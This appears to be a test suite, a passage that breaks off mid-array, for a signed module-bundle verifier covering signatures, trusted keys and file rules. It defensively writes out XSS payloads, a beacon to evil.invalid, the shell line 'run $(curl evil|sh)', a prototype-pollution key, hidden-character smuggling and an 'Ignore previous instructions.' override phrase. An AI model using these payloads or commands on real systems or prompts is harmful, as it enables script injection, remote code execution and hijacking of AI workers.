// Module Contract v1, next slice: the signed canonical bundle verifier. These
// prove the digest covers exactly the bundle, a signature cannot be moved to
// other bytes or rewritten, only owner-trusted keys count, CODE needs a
// reviewed or signed source, and declarative bundles stay inert text.
import assert from "node:assert/strict";
import { generateKeyPairSync, sign, type KeyObject } from "node:crypto";
import test from "node:test";
import {
  MODULE_BUNDLE_SCHEMA_V1, MODULE_MANIFEST_SCHEMA_V1, MODULE_SIGNATURE_SCHEMA_V1, canonicalModuleBundleV1,
  moduleAuthoritySurfaceV1, moduleCompatibilitySatisfiedV1, moduleKeyIdV1, modulePermissionDiffV1,
  signModuleBundleV1, verifyModuleBundleV1, type ModuleBundleInputV1, type ModuleTrustPolicyV1,
} from "../src/modules/v1";
import { sha256Digest } from "../src/security/canonical-digest";
import { assertModulePermissionDiffV1, previousModulePermissionsDigestV1, legacyModulePermissionsDigestV1, moduleBundleSignatureMaterialV1 } from "../src/modules/v1/bundle";

const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
function keyPair(): { privateKey: KeyObject; spki: string; keyId: string } {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const spki = publicKey.export({ format: "der", type: "spki" }).toString("base64url");
  return { privateKey, spki, keyId: moduleKeyIdV1(spki) };
}
const publisher = keyPair(), stranger = keyPair();
const trust = (overrides: Partial<ModuleTrustPolicyV1> = {}): ModuleTrustPolicyV1 => ({
  trustedKeys: [{ keyId: publisher.keyId, publicKeySpki: publisher.spki, label: "Test publisher", moduleIds: ["weeklyDigest", "sourceTools"] }],
  reviewedBundleDigests: [], ...overrides });
const options = (overrides: Partial<ModuleTrustPolicyV1> = {}) => ({ trust: trust(overrides), hostVersion: "0.1.0" });

function manifest(overrides: Record<string, unknown> = {}) {
  return {
    schema: MODULE_MANIFEST_SCHEMA_V1, id: "weeklyDigest", version: "1.0.0", name: "Weekly digest",
    publisher: "Example Publisher", license: "Apache-2.0", controlRoomCompatibility: "^0.1.0", class: "declarative",
    permissions: {
      projectData: [{ resource: "module_weekly_digest_notes", access: ["read"] }],
      taskTemplates: ["digest.weekly"], pipelineTemplates: [], workerCapabilities: ["text.reasoning"],
      notifications: { slots: ["project.digest"], maxPerHour: 2 },
      attention: { slots: [], maxOpenPerProject: 0 },
      scheduledJobs: { jobs: [], maxConcurrent: 0, maxRunsPerDay: 0, maxRuntimeSeconds: 0 },
    },
    ui: { projectTabs: [{ id: "digest.tab", label: "Digest" }], needsYou: false },
    events: { subscribe: ["project.created"], emitNotifications: true },
    ...overrides,
  };
}
function declarative(overrides: Record<string, unknown> = {}): ModuleBundleInputV1 {
  return { schema: MODULE_BUNDLE_SCHEMA_V1, manifest: manifest(overrides), files: [
    { path: "prompts/weekly.md", contentBase64: b64("Summarise the week's project activity.\n") },
    { path: "templates/digest.json", contentBase64: b64("{\"title\":\"Weekly digest\"}") },
  ] };
}
function code(overrides: Record<string, unknown> = {}): ModuleBundleInputV1 {
  return { schema: MODULE_BUNDLE_SCHEMA_V1,
    manifest: manifest({ id: "sourceTools", name: "Source tools", class: "code",
      data: { schemaNamespace: "module_source_tools", tenantScoped: true, projectScoped: true,
        migrations: [{ version: "1.0.0", upFile: "migrations/0001.up.sql", downFile: "migrations/0001.down.sql" }] },
      ...overrides }),
    files: [
      { path: "dist/index.js", contentBase64: b64("export const answer = 42;\n") },
      { path: "migrations/0001.up.sql", contentBase64: b64("CREATE TABLE module_source_tools.notes(id text);\n") },
      { path: "migrations/0001.down.sql", contentBase64: b64("DROP TABLE module_source_tools.notes;\n") },
    ] };
}
const withFile = (bundle: ModuleBundleInputV1, path: string, text: string): ModuleBundleInputV1 =>
  ({ ...bundle, files: [...bundle.files.filter(file => file.path !== path), { path, contentBase64: b64(text) }] });

test("a declarative bundle verifies unsigned, with an order-independent digest and an inert frozen result", () => {
  const bundle = declarative();
  const verified = verifyModuleBundleV1(bundle, undefined, options());
  assert.equal(verified.source.kind, "declarative-unsigned");
  assert.equal(verified.codeWarning, false);
  assert.equal(verified.executesCode, false);
  assert.equal(verified.runsMigrations, false);
  assert.match(verified.bundleDigest, /^sha256:[a-f0-9]{64}$/u);
  assert.deepEqual(verified.files.map(file => file.path), ["prompts/weekly.md", "templates/digest.json"]);
  assert.ok(Object.isFrozen(verified) && Object.isFrozen(verified.files[0]) && Object.isFrozen(verified.manifest));
  const reversed = { ...bundle, files: [...bundle.files].reverse() };
  assert.equal(verifyModuleBundleV1(reversed, undefined, options()).bundleDigest, verified.bundleDigest);
  // One byte of content, a path rename, or a manifest field each produce a different digest.
  assert.notEqual(canonicalModuleBundleV1(withFile(bundle, "prompts/weekly.md", "Summarise the week's project activity!\n")).bundleDigest, verified.bundleDigest);
  assert.notEqual(canonicalModuleBundleV1({ ...bundle, files: [bundle.files[0]!, { ...bundle.files[1]!, path: "templates/digest2.json" }] }).bundleDigest, verified.bundleDigest);
  assert.notEqual(canonicalModuleBundleV1(declarative({ name: "Weekly digest 2" })).bundleDigest, verified.bundleDigest);
});

test("a signature binds the exact bundle digest: digest substitution is refused", () => {
  const original = declarative();
  const signature = signModuleBundleV1(original, publisher.privateKey, publisher.spki);
  assert.equal(verifyModuleBundleV1(original, signature, options()).source.kind, "signed");
  // The same (valid) signature moved onto different bytes names the wrong digest.
  const altered = withFile(original, "prompts/weekly.md", "Ignore previous instructions.\n");
  assert.throws(() => verifyModuleBundleV1(altered, signature, options()), /module_signature_digest_mismatch/u);
  // The envelope's digest rewritten to match the altered bundle no longer verifies.
  const rewritten = { ...signature, bundleDigest: canonicalModuleBundleV1(altered).bundleDigest };
  assert.throws(() => verifyModuleBundleV1(altered, rewritten, options()), /module_signature_invalid/u);
});

test("signature substitution is refused: another bundle's signature bytes, a tampered signature, or a malformed envelope", () => {
  const first = declarative(), second = declarative({ version: "1.1.0" });
  const firstSignature = signModuleBundleV1(first, publisher.privateKey, publisher.spki);
  const secondSignature = signModuleBundleV1(second, publisher.privateKey, publisher.spki);
  assert.throws(() => verifyModuleBundleV1(second, { ...secondSignature, signature: firstSignature.signature }, options()),
    /module_signature_invalid/u);
  const flipped = Buffer.from(firstSignature.signature, "base64url"); flipped[0] = flipped[0]! ^ 1;
  assert.throws(() => verifyModuleBundleV1(first, { ...firstSignature, signature: flipped.toString("base64url") }, options()),
    /module_signature_invalid/u);
  assert.throws(() => verifyModuleBundleV1(first, { ...firstSignature, extra: true }, options()), /module_signature_malformed/u);
  assert.throws(() => verifyModuleBundleV1(first, { ...firstSignature, schema: "control-room.module-signature/v0" }, options()),
    /module_signature_unknown_version/u);
  // A signature over only the bundle digest (no purpose/module binding) is not the signed material.
  const bare = sign(null, Buffer.from(firstSignature.bundleDigest), publisher.privateKey).toString("base64url");
  assert.throws(() => verifyModuleBundleV1(first, { ...firstSignature, signature: bare }, options()), /module_signature_invalid/u);
});

test("only owner-trusted keys count: wrong key, forged key id, key limited to other modules, bad policy", () => {
  const bundle = declarative();
  // Signed by a key the owner never trusted.
  assert.throws(() => verifyModuleBundleV1(bundle, signModuleBundleV1(bundle, stranger.privateKey, stranger.spki), options()),
    /module_signature_signer_untrusted/u);
  // Signed by the stranger but claiming the trusted publisher's key id: verified with the TRUSTED key, so it fails.
  const digest = canonicalModuleBundleV1(bundle).bundleDigest;
  const forged = { schema: MODULE_SIGNATURE_SCHEMA_V1, keyId: publisher.keyId, bundleDigest: digest,
    signature: sign(null, moduleBundleSignatureMaterialV1(publisher.keyId, digest, "weeklyDigest", "1.0.0"), stranger.privateKey).toString("base64url") };
  assert.throws(() => verifyModuleBundleV1(bundle, forged, options()), /module_signature_invalid/u);
  // A trusted key that may only vouch for other module ids.
  const narrow = { trustedKeys: [{ keyId: publisher.keyId, publicKeySpki: publisher.spki, label: "Narrow", moduleIds: ["otherModule"] }] };
  assert.throws(() => verifyModuleBundleV1(bundle, signModuleBundleV1(bundle, publisher.privateKey, publisher.spki), options(narrow)),
    /module_signature_signer_not_allowed_for_module/u);
  // A policy entry whose key id does not match its key bytes is refused outright.
  const mislabeled = { trustedKeys: [{ keyId: stranger.keyId, publicKeySpki: publisher.spki, label: "Wrong", moduleIds: ["*"] }] };
  assert.throws(() => verifyModuleBundleV1(bundle, undefined, options(mislabeled)), /module_trust_key_id_mismatch/u);
  // Only Ed25519 keys are accepted.
  const p256 = generateKeyPairSync("ec", { namedCurve: "P-256" }).publicKey.export({ format: "der", type: "spki" }).toString("base64url");
  assert.throws(() => moduleKeyIdV1(p256), /module_trust_key_invalid/u);
  // A present signature is never ignored: an untrusted signature on a DECLARATIVE bundle does not fall back to unsigned.
  assert.throws(() => verifyModuleBundleV1(bundle, { ...forged, keyId: stranger.keyId }, options()), /module_signature_signer_untrusted/u);
});

test("CODE modules need a reviewed digest or a trusted signature; the warning is always raised", () => {
  const bundle = code();
  assert.throws(() => verifyModuleBundleV1(bundle, undefined, options()), /module_bundle_code_source_untrusted/u);
  assert.throws(() => verifyModuleBundleV1(bundle, null, options()), /module_bundle_code_source_untrusted/u);
  const signed = verifyModuleBundleV1(bundle, signModuleBundleV1(bundle, publisher.privateKey, publisher.spki), options());
  assert.deepEqual({ kind: signed.source.kind, warning: signed.codeWarning }, { kind: "signed", warning: true });
  const digest = canonicalModuleBundleV1(bundle).bundleDigest;
  const reviewed = verifyModuleBundleV1(bundle, undefined, options({ reviewedBundleDigests: [digest] }));
  assert.deepEqual({ kind: reviewed.source.kind, warning: reviewed.codeWarning }, { kind: "reviewed", warning: true });
  // A reviewed pin is for those exact bytes only.
  assert.throws(() => verifyModuleBundleV1(withFile(bundle, "dist/index.js", "export const answer = 43;\n"), undefined,
    options({ reviewedBundleDigests: [digest] })), /module_bundle_code_source_untrusted/u);
  // Every declared migration must be present as a bundle file.
  const missing = { ...bundle, files: bundle.files.filter(file => file.path !== "migrations/0001.down.sql") };
  assert.throws(() => verifyModuleBundleV1(missing, signModuleBundleV1(missing, publisher.privateKey, publisher.spki), options()),
    /module_bundle_migration_file_missing/u);
});

test("declarative bundles carry only inert text and never migrations", () => {
  const signedOptions = options();
  assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "hooks/run.js", "process.exit(1)"), undefined, signedOptions),
    /module_bundle_declarative_file_not_allowed/u);
  assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "setup.sql", "SELECT 1;"), undefined, signedOptions),
    /module_bundle_declarative_file_not_allowed/u);
  const binary = { ...declarative(), files: [{ path: "notes.txt", contentBase64: Buffer.from([0xff, 0xfe, 0x00]).toString("base64") }] };
  assert.throws(() => verifyModuleBundleV1(binary, undefined, signedOptions), /module_bundle_declarative_file_not_text/u);
  assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "notes.txt", "bell\u0007"), undefined, signedOptions),
    /module_bundle_declarative_file_not_text/u);
  const withData = declarative({ data: { schemaNamespace: "module_weekly_digest", tenantScoped: true, projectScoped: true, migrations: [] } });
  assert.throws(() => verifyModuleBundleV1(withData, undefined, signedOptions), /module_bundle_declarative_declares_migrations/u);
  // Signing does not turn a declarative bundle into a vehicle for code.
  const smuggled = withFile(declarative(), "run.sh", "echo hi");
  assert.throws(() => verifyModuleBundleV1(smuggled, signModuleBundleV1(smuggled, publisher.privateKey, publisher.spki), signedOptions),
    /module_bundle_declarative_file_not_allowed/u);
});

test("declarative text refuses embedded script, hidden direction or invisible characters, and non-strict JSON", () => {
  const refuses = (path: string, text: string, code: RegExp) => {
    const bundle = withFile(declarative(), path, text);
    assert.throws(() => verifyModuleBundleV1(bundle, undefined, options()), code, `${path}: ${JSON.stringify(text)}`);
    // Signing never turns a refused declarative file into an accepted one.
    assert.throws(() => verifyModuleBundleV1(bundle, signModuleBundleV1(bundle, publisher.privateKey, publisher.spki), options()),
      code, `${path} signed`);
  };
  const executable = /module_bundle_declarative_file_executable_content/u;
  refuses("a.md", "<script>alert(1)</script>", executable);
  refuses("a.md", "<SCRIPT src=x></SCRIPT>", executable);
  refuses("a.md", "[x](javascript:alert(1))", executable);
  // A literal tab inside an unwrapped destination is a control character CommonMark
  // forbids there, so this never becomes a link at all: it is inert bracketed text,
  // exactly as the app's own renderer (react-markdown) would also read it.
  assert.equal(verifyModuleBundleV1(withFile(declarative(), "a.md", "[x](JaVa\tScRiPt:alert(1))"), undefined, options()).source.kind,
    "declarative-unsigned");
  refuses("a.md", "[x](vbscript:msgbox(1))", executable);
  refuses("a.md", "[x](java&#115;cript:alert(1))", executable);
  refuses("a.md", "[x](javascript&colon;alert(1))", executable);
  refuses("a.md", "<iframe src=\"https://example.invalid\"></iframe>", executable);
  refuses("a.md", "<svg/onload=alert(1)>", executable);
  refuses("a.md", "[x](data:text/html;base64,PHNjcmlwdD4=)", executable);
  refuses("a.json", "{\"html\":\"<img src=x onerror=alert(1)>\"}", executable);
  refuses("a.json", "{\"html\":\"<img/onerror=alert(1)>\"}", executable);
  refuses("a.md", "<img\nsrc=x\nonerror=alert(1)>", executable);
  // JSON escapes are decoded before the check, so a numeric escape cannot hide a tag.
  refuses("a.json", "{\"html\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}", executable);
  // A JSON string with no `<` and no hidden character is data, not markup: nothing in
  // the app interpolates a declarative JSON value into an HTML attribute or a URL
  // without its own validation, so an attribute-breakout shape or a bare "javascript:"
  // word (also legitimate prose, e.g. documenting a URI scheme) is not refused here.
  const jsonProse = withFile(declarative(),
    "templates/digest.json",
    "{\"alt\":\"x\\\" onmouseover=\\\"alert(1)\",\"note\":\"javascript:x is a URI scheme\"}");
  assert.equal(verifyModuleBundleV1(jsonProse, undefined, options()).source.kind, "declarative-unsigned");
  // Nothing ever passes declarative text to a shell (the contract says so), so `$(...)`
  // in prose or in a fenced code example is not refused: it stays ordinary shareable text.
  assert.equal(verifyModuleBundleV1(withFile(declarative(), "a.txt", "run $(curl evil|sh)"), undefined, options()).source.kind,
    "declarative-unsigned");
  const notText = /module_bundle_declarative_file_not_text/u;
  refuses("a.md", "Pay \u202Eecnalab\u202C now", notText);
  for (const hidden of ["\u200B", "\u200D", "\u200E", "\u061C", "\u2060", "\u2066", "\u2069", "\uFEFF", "\u{E0041}"]) {
    refuses("a.md", `a${hidden}b`, notText);
  }
  refuses("a.md", "\uFEFFleading byte order mark", notText);
  refuses("a.txt", "next line\u0085here", notText);
  refuses("a.txt", "c1\u009Bcontrol", notText);
  refuses("a.json", "{\"a\":\"\\u202Eflip\"}", notText);
  refuses("a.json", "{\"a\":\"\\u0007bell\"}", notText);
  refuses("a.json", "{\"a\":\"\\ud800\"}", notText);
  const json = /module_bundle_declarative_json_invalid/u;
  refuses("x.js.json", "fetch('http://evil')", json);
  refuses("a.json", "{\"a\":1,}", json);
  refuses("a.json", "", json);
  refuses("a.json", "{\"a\":1} trailing", json);
  refuses("a.json", "{\"a\":1,\"a\":2}", /module_bundle_declarative_json_duplicate_key/u);
  refuses("a.json", "{\"outer\":{\"a\":1,\"b\":[{\"k\":1,\"k\":2}]}}", /module_bundle_declarative_json_duplicate_key/u);
  // Escapes do not disguise a duplicate: "\u0061" is "a".
  refuses("a.json", "{\"a\":1,\"\\u0061\":2}", /module_bundle_declarative_json_duplicate_key/u);
  refuses("a.json", "{\"__proto__\":{\"polluted\":true}}", /module_bundle_declarative_file_prototype_pollution_key/u);

  // Ordinary prompt prose, markdown, and JSON stay shareable, including words the CREDENTIAL and
  // AUTHORITY guards would refuse in manifest text: those are not applied to prompt bodies.
  const prose = withFile(withFile(withFile(declarative(), "prompts/review.md",
    "# Reviewer\n\nrole: reviewer. You may grant access in prose, mention a password: field, and cite `code`.\n"
    + "Use **bold**, [a link](https://example.invalid/docs), a hard line break,\\\nand costs of $5 or (a) lists.\n"
    + "- one\n- two\n\n```\necho $(pwd)\n```\n\n"
    + "The button once = twice; online=yes; café, naïve, 日本語, emoji 🎉.\n"),
  "templates/nested.json", "[{\"a\":{\"b\":[1,2,{\"a\":3}]},\"k\":\"v\"},{\"a\":\"same key, other object\"}]"),
  "notes.txt", "tabs\tand\r\nnewlines are fine\n");
  assert.equal(verifyModuleBundleV1(prose, undefined, options()).source.kind, "declarative-unsigned");

  // A file this dense with `<` is refused outright before the parser ever sees it,
  // independent of timing: parsing a lone run of bare `<` costs the markdown parser
  // far more than linear time (measured well over a second per megabyte).
  refuses("dense.txt", "<".repeat(20_000), executable);
  // The markdown byte ceiling now applies before parsing, even to bare punctuation.
  refuses("over-budget.txt", "<".repeat(9_000), executable);
  assert.equal(verifyModuleBundleV1(withFile(declarative(), "sparse.txt", "<".repeat(8_000)), undefined, options()).source.kind,
    "declarative-unsigned");

  // Near-limit hostile text stays fast: none of the checks backtrack across the file.
  for (const text of ["<".repeat(1_000_000), "<a ".repeat(330_000), "j \t".repeat(330_000), "\" /".repeat(330_000), "&#".repeat(500_000)]) {
    const started = performance.now();
    try { verifyModuleBundleV1(withFile(declarative(), "big.txt", text), undefined, options()); } catch { /* either answer is fine */ }
    assert.ok(performance.now() - started < 2_000, `${JSON.stringify(text.slice(0, 3))} took too long`);
  }
  const deep = `${"[".repeat(5_000)}${"]".repeat(5_000)}`;
  assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "deep.json", deep), undefined, options()), /input_too_deep/u);
});

test("the allowlist filter closes every bypass the security reviews found (N1-N4), and stops refusing ordinary text (N5)", () => {
  const executable = /module_bundle_declarative_file_executable_content/u;
  const notText = /module_bundle_declarative_file_not_text/u;
  const refuses = (path: string, text: string, code: RegExp) => {
    assert.throws(() => verifyModuleBundleV1(withFile(declarative(), path, text), undefined, options()), code, `${path}: ${JSON.stringify(text)}`);
  };
  const passes = (path: string, text: string) => {
    assert.equal(verifyModuleBundleV1(withFile(declarative(), path, text), undefined, options()).source.kind,
      "declarative-unsigned", `${path}: ${JSON.stringify(text)}`);
  };

  // N1: an event handler hidden behind a stray `>` inside a quoted attribute, and other
  // tags the old tag list never named. The single "no raw HTML at all" rule catches all
  // of them, in markdown and inside a JSON string value alike.
  refuses("a.md", "<img alt=\">\" src=x onerror=alert(1)>", executable);
  refuses("a.md", "<img title='>' src=x onerror=alert(1)>", executable);
  refuses("a.md", "<a title=\">\" x onclick=alert(1)>", executable);
  refuses("a.json", "{\"a\":\"<img alt=\\\">\\\" src=x onerror=alert(1)>\"}", executable);
  refuses("a.md", "<portal src=https://evil.invalid>", executable);
  refuses("a.md", "<button formaction=https://evil.invalid>submit</button>", executable);
  refuses("a.md", "<div style=\"background:url(https://evil.invalid/x)\">", executable);
  refuses("a.md", "<div style=\"width:expression(alert(1))\">", executable);
  refuses("a.md", "<img src=https://evil.invalid/beacon>", executable);

  // N2: markdown backslash escapes and `data:` variants. The real parser decodes the
  // destination exactly as react-markdown would before its scheme is checked.
  refuses("a.md", "[x](javascript\\:alert(1))", executable);
  refuses("a.md", "[r]: javascript\\:alert(1)\n\n[link][r]", executable);
  refuses("a.md", "![x](data:image/svg+xml;base64,QUJD)", executable);
  refuses("a.md", "[x](data:application/xhtml+xml,x)", executable);
  // An https(s) image is not refused here: the beacon concern belongs to the renderer,
  // which already shows agent-result images as a placeholder (private-app/app/result-text.tsx).
  passes("a.md", "![](https://evil.invalid/beacon.png)");

  // N3: every invisible/format/variation-selector/bidi carrier, not just the ones the
  // first fix happened to name.
  refuses("a.md", `a${String.fromCodePoint(0xE0101)}b`, notText); // variation selector supplement
  refuses("a.json", JSON.stringify({ a: `before${String.fromCodePoint(0xE0101)}after` }), notText); // via a JSON surrogate pair
  refuses("a.md", "a\u{FE01}b", notText); // a variation selector that is not FE0E/FE0F
  refuses("a.md", "a\u{FE0F}b", notText); // FE0F with no pictograph directly before it
  refuses("a.md", `${String.fromCodePoint(0x2764)}${String.fromCodePoint(0xFE0F)}${String.fromCodePoint(0xFE0F)}`, notText); // two in a row
  refuses("a.md", "a\u{00AD}b", notText); // soft hyphen
  refuses("a.md", "a\u{034F}b", notText); // combining grapheme joiner
  refuses("a.md", "a\u{180E}b", notText); // Mongolian vowel separator
  refuses("a.md", "a\u{180B}b", notText); // Mongolian free variation selector one
  refuses("a.md", "a\u{3164}b", notText); // Hangul filler
  refuses("a.md", "a\u{206A}b", notText); // deprecated format character
  refuses("a.md", "a\u{1D173}b", notText); // musical symbol begin beam (a Cf format character)
  refuses("a.md", "a\u{2028}b", notText); // line separator
  refuses("a.md", "a\u{E000}b", notText); // private use
  refuses("a.md", "a\u{0378}b", notText); // unassigned

  // N4: the manifest's own name/publisher get the same character allowlist, because the
  // owner's approval card shows them verbatim.
  const hiddenName = /module_manifest_.*_hidden_text/u;
  assert.throws(() => verifyModuleBundleV1(declarative({ name: `Weekly ${String.fromCodePoint(0x202E)}gidtsid` }), undefined, options()),
    hiddenName);
  assert.throws(() => verifyModuleBundleV1(declarative({ publisher: `Example${String.fromCodePoint(0x200B)}Publisher` }), undefined, options()),
    hiddenName);
  assert.throws(() => verifyModuleBundleV1(declarative({ publisher: `Example${String.fromCodePoint(0xE0101)}Publisher` }), undefined, options()),
    hiddenName);

  // N5: the allowlist stops guessing at obfuscation, so it stops misreading ordinary text.
  passes("a.md", "We use JavaScript: it is a language.\n");
  passes("a.md", `An emoji with an explicit presentation selector: ${String.fromCodePoint(0x2764)}${String.fromCodePoint(0xFE0F)}\n`);
  passes("a.md", "An HTML entity in prose, not inside a tag: &#8212; an em dash.\n");
  passes("a.md", "Greek: αβγ. Hebrew: אבג. Arabic: ابج.\n");
});

test("bundle paths, encodings, sizes and shape are strict", () => {
  for (const path of ["../escape.md", "a/../b.md", "/abs.md", "a//b.md", "./a.md", "Readme.md", "a\\b.md", ".hidden.md", "",
    "a/b/c/d/e/f/g/h/i.md", `${"a".repeat(65)}.md`]) {
    assert.throws(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), /module_bundle_path_invalid/u, path);
  }
  // Names that would collide or misbehave once staged on disk: a trailing dot (Windows drops it)
  // and reserved device names, with or without an extension.
  for (const path of ["a.", "dir./a.md", "a-.", "con", "con.txt", "prompts/aux.md", "nul.json", "com1.md", "lpt9.txt", "prn"]) {
    assert.throws(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), /module_bundle_path_invalid/u, path);
  }
  for (const path of ["console.md", "auxiliary.txt", "com10.md", "prompts/null.md", "a.b.md"]) {
    assert.doesNotThrow(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), path);
  }
  const bundle = declarative();
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [...bundle.files, bundle.files[0]!] }), /module_bundle_duplicate_path/u);
  // A file may not also be a directory of another file, in either order.
  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "x.md", "a"), "x.md/y.md", "b")), /module_bundle_path_collision/u);
  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d/e/f.md", "a"), "d", "b")), /module_bundle_path_collision/u);
  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d", "b"), "d/e/f.md", "a")), /module_bundle_path_collision/u);
  assert.doesNotThrow(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d/e.md", "a"), "d/ef.md", "b")));
  for (const encoded of ["aGk", "aGk=\n", "aGl=", "a GE=", "!!!!"]) {
    assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [{ path: "a.md", contentBase64: encoded }] }),
      /module_bundle_file_encoding_invalid/u, encoded);
  }
  const big = Buffer.alloc(1_048_577).toString("base64");
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [{ path: "a.md", contentBase64: big }] }), /module_bundle_file_encoding_invalid|module_bundle_file_oversized/u);
  const many = Array.from({ length: 257 }, (_, index) => ({ path: `f${index}.md`, contentBase64: b64("x") }));
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: many }), /module_bundle_files_invalid/u);
  const nineMiB = Array.from({ length: 9 }, (_, index) => ({ path: `f${index}.txt`, contentBase64: Buffer.alloc(1_048_576, 97).toString("base64") }));
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: nineMiB }), /module_bundle_oversized/u);
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, extra: 1 }), /module_bundle_malformed/u);
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, schema: "control-room.module-bundle/v2" }), /module_bundle_unknown_version/u);
  assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [{ path: "a.md", contentBase64: b64("x"), mode: 493 }] }),
    /module_bundle_files_invalid/u);
  assert.throws(() => canonicalModuleBundleV1(JSON.parse(`{"schema":"${MODULE_BUNDLE_SCHEMA_V1}","manifest":${JSON.stringify(manifest())},"files":[{"__proto__":{"x":1},"path":"a.md","contentBase64":"eA=="}]}`)),
    /module_bundle_prototype_pollution_key/u);
  // The manifest keeps every Module Contract v1 guard.
  assert.throws(() => canonicalModuleBundleV1(declarative({ name: "<script>alert(1)</script>" })), /executable_content/u);
  assert.throws(() => verifyModuleBundleV1(bundle, undefined, { ...options(), extra: true } as never), /module_bundle_options_invalid/u);
});

test("the host version must satisfy the manifest's compatibility range", () => {
  assert.throws(() => verifyModuleBundleV1(declarative({ controlRoomCompatibility: "^0.2.0" }), undefined, options()),
    /module_bundle_incompatible/u);
  assert.throws(() => verifyModuleBundleV1(declarative(), undefined, { trust: trust(), hostVersion: "latest" }),
    /module_bundle_host_version_invalid/u);
  const table: [string, string, boolean][] = [
    ["^0.1.0", "0.1.0", true], ["^0.1.0", "0.1.9", true], ["^0.1.0", "0.2.0", false], ["^0.1.0", "0.2.0-rc.1", false],
    ["^1.2.3", "1.9.0", true], ["^1.2.3", "2.0.0", false], ["^1.2.3", "1.2.2", false], ["^0.0.3", "0.0.4", false],
    ["~1.2.3", "1.2.9", true], ["~1.2.3", "1.3.0", false], [">=1.0.0 <2.0.0", "1.5.0", true], [">=1.0.0 <2.0.0", "2.0.0", false],
    ["1.0.0", "1.0.0", true], ["1.0.0", "1.0.1", false], [">1.0.0", "1.0.0-beta", false], ["<=1.0.0", "1.0.0-beta", true],
    ["^1.0.0", "1.0.0-beta", false], [">=1.0.0-alpha.2", "1.0.0-alpha.10", true], [">=1.0.0-alpha", "1.0.0-alpha.1", true],
  ];
  for (const [range, host, expected] of table) assert.equal(moduleCompatibilitySatisfiedV1(range, host), expected, `${range} ${host}`);
});

test("a manifest tampered after signing fails, and the authority diff shows exactly what widened", () => {
  const original = declarative();
  const signature = signModuleBundleV1(original, publisher.privateKey, publisher.spki);
  const widened = { ...original, manifest: manifest({ permissions: { ...manifest().permissions,
    projectData: [{ resource: "module_weekly_digest_notes", access: ["read", "write"] }] } }) };
  assert.throws(() => verifyModuleBundleV1(widened, signature, options()), /module_signature_digest_mismatch/u);
  const before = verifyModuleBundleV1(original, signature, options());
  const after = verifyModuleBundleV1(widened, signModuleBundleV1(widened, publisher.privateKey, publisher.spki), options());
  assert.notEqual(after.permissionsDigest, before.permissionsDigest);
  assert.deepEqual(modulePermissionDiffV1(before.authoritySurface, after.authoritySurface),
    { added: ["projectData:module_weekly_digest_notes:write"], removed: [] });
  assert.deepEqual(modulePermissionDiffV1(null, before.authoritySurface).added, before.authoritySurface);
  // R7L-09: identity metadata must be visible in the acknowledged surface.
  const renamed = verifyModuleBundleV1(declarative({ name: "Weekly digest (renamed)" }), undefined, options());
  assert.notEqual(renamed.bundleDigest, before.bundleDigest);
  assert.notEqual(renamed.permissionsDigest, before.permissionsDigest);
  assert.ok(modulePermissionDiffV1(before.authoritySurface,renamed.authoritySurface).added.some(line => line.startsWith("name:")));
  assert.deepEqual(moduleAuthoritySurfaceV1(before.manifest), before.authoritySurface);
  const codeSurface = verifyModuleBundleV1(code(), signModuleBundleV1(code(), publisher.privateKey, publisher.spki), options()).authoritySurface;
  assert.ok(codeSurface.includes("class:code") && codeSurface.includes("data.migration:1.0.0")
    && codeSurface.includes("data.schema:module_source_tools"));
});


const sharedSkill = (patch: Record<string, unknown> = {}) => {
  const content = { schema: "control-room.module-shared-skill/v1", id: "skill.summary", version: 1,
    name: "Summary skill", instructions: "Summarise the saved evidence.", ...patch };
  const { schema: _schema, ...skill } = content;
  return { ...skill, contentDigest: sha256Digest(content) };
};

test("R7L-09: every reviewed hash-field change has a visible permission line", () => {
  const base = canonicalModuleBundleV1(declarative()).manifest;
  const settings = { type: "object", properties: { count: { type: "integer", title: "Count", default: 1 } },
    required: ["count"], additionalProperties: false };
  const skillBase = canonicalModuleBundleV1(declarative({ skills: [sharedSkill()] })).manifest;
  const cases: Array<[string, typeof base, unknown, string]> = [
    ["skills added", base, { ...base, skills: [sharedSkill()] }, "skill.id:"],
    ["skills id", skillBase, { ...skillBase, skills: [sharedSkill({ id: "skill.other" })] }, "skill.id:"],
    ["skills name", skillBase, { ...skillBase, skills: [sharedSkill({ name: "Revised summary" })] }, "skill.name:"],
    ["skills instructions", skillBase, { ...skillBase, skills: [sharedSkill({ instructions: "Use only checked evidence." })] }, "skill.instructionsDigest:"],
    ["skills version", skillBase, { ...skillBase, skills: [sharedSkill({ version: 2 })] }, "skill.version:"],
    ["skills removed", skillBase, base, "skills:"],
    ["empty skills added", base, { ...base, skills: [] }, "skills:"],
    ["tab label", base, { ...base, ui: { ...base.ui, projectTabs: [{ id: "digest.tab", label: "New label" }] } }, "ui.projectTab.label:"],
    ["settings added", base, { ...base, ui: { ...base.ui, settings } }, "ui.settings:"],
    ["nav label", { ...base, ui: { ...base.ui, navEntry: { id: "digest.nav", label: "Digest" } } },
      { ...base, ui: { ...base.ui, navEntry: { id: "digest.nav", label: "Renamed" } } }, "ui.navEntry.label:"],
    ["data added", base, { ...base, data: { schemaNamespace: "module_weekly_digest", tenantScoped: true,
      projectScoped: true, migrations: [] } }, "data.schema:"],
    ["access widened", base, { ...base, permissions: { ...base.permissions,
      projectData: [{ resource: "module_weekly_digest_notes", access: ["read", "write"] }] } }, "projectData:"],
  ];
